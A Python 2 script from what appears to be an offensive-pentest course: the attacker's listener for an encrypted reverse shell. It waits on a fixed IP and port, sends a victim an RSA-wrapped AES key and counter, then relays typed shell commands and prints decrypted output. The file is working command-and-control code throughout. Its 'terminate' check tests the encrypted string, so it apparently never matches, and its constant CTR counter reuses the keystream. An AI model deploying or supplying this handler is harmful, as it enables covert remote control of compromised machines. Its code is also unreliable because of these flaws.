# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2

# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7
# http://www.voidspace.org.uk/python/modules.shtml#pycrypto

# Download Pycrypto source
# https://pypi.python.org/pypi/pycrypto
# For Kali, after extract the tar file, invoke "python setup.py install"


import socket    
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES

import string
import random




def encrypt_AES_KEY(KEY):

    publickey ="""-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA9UHDhYrU529GsfkJqKSF
6q3CfpSkb00gA12c3NuNb2QZgpkHRsfQ/zPmKlFvuAHNjn43j3ser/SQ6q0GN92N
niK9cne+UdKoXf0e+8PqZsoIlOXh9QNPnuXmD+o6tXevh3ZpUyCaNPiF+g0fHv12
w1xCkVki5Kp+hf8YbB6lCxUJvf8a0n1bWCBKkbe2jJUOjkVLIvUVkojCOw61stHZ
QJtFgGQUup4D0cozs5bXHfRw7Tc7Q2VEnTOGfIEZJcC7FbboMaQxRu0v7KKH93OR
HlIEbZFFX7kelrR8S8pnIfspZXHrAmSImlWDljeSZpMViTGLBniw0kztDLtQJSY4
HL4SkOTm0QgsO1dkbs3PR2RsYh7aaDWgAATT0MPhQMUNMIdceaEJeYiudsBFMLMQ
JHok3+0MR/1eO4aO2nH5ojANXxOyec8V3IXz0LZCGFsrfB9gv9TD/YRs6qEF62wl
tDqIGyVQoXQNmxriH+0YgMwxUPKHiGVCaPYXe5dpd89GeGYC6Jcbc9+q9cjfG+kR
GQtgr/w48RM79bBHw5A0b3uXqmjTPTgZ6hMxShMWngSHOm5BV+ZY1MyEA51+qDon
GOLCYLRGWnF1PyCMoxX+qVEE6gAFVNkYULdjiWpU+gmoYxe0rNqjCzbUdXizUGVQ
Ua9aLXDYbrOz6O1gKngclsECAwEAAQ==
-----END PUBLIC KEY-----"""

    encryptor = RSA.importKey(publickey)
    encriptedData=encryptor.encrypt(KEY, 0)
    return encriptedData[0]


def encrypt(message):
    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return encrypto.encrypt(message)

def decrypt(message):
    decrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return  decrypto.decrypt(message) 

def connect():
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
    
    s.bind(("10.10.10.100", 8080))                           
    
    s.listen(1)                                             
                                                            
    
    print '[+] Listening for incoming TCP connection on port 8080'
    
    conn, addr = s.accept()     
    
    print '[+] We got a connection from: ', addr
    
    
    global key
    key = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(32))
    print "Generated AES Key " + str(key)
    conn.send ( encrypt_AES_KEY(key) )
    

    global counter
    counter = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(16))
    conn.send ( encrypt_AES_KEY(counter) )

    while True:
        
        command = raw_input("Shell> ")
        command = encrypt(command)
        
        if 'terminate' in command:       
            conn.send('terminate')
            conn.close()
            break

        else:
            conn.send(command)    
            print decrypt ( conn.recv(1024) )
        
def main ():
    connect()
main()










